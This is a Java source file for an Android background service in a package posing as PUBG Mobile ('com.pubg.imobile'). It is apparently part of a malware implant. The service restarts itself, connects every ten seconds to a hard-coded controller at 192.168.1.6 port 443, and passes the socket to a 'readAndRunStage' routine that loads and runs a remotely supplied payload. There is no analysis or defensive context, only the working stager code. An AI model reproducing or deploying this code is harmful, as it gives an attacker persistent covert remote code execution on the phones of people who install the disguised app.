package com.pubg.imobile;

import static com.pubg.imobile.Cheetah.params;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.net.Socket;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class Job extends Service {
    public final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
    public static Socket sock;


    public Job() {

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Cheetah.a(this);
        B();
        return START_STICKY;
    }

    public void B() {
        long initialDelay = 10;
        long period = 10;
        scheduler.scheduleAtFixedRate(() -> {
            try {
                Job.A();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }, initialDelay, period, TimeUnit.SECONDS);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static void A() throws IOException {
            int port = 443;
            String host = "192.168.1.6";
            try {
                sock = new Socket(host, port);
                new ReadStage().start();
            } catch (IOException e) {
                throw new IOException();
            }
    }

    public static class ReadStage extends Thread {
        @Override
        public void run() {
            try {
                Cheetah.readAndRunStage(new DataInputStream(sock.getInputStream()), new DataOutputStream(sock.getOutputStream()), params);
            } catch (IOException | NoSuchMethodException | IllegalAccessException |
                     InstantiationException | InvocationTargetException | ClassNotFoundException e) {
                throw new RuntimeException(e);
            }
        }

    }
}
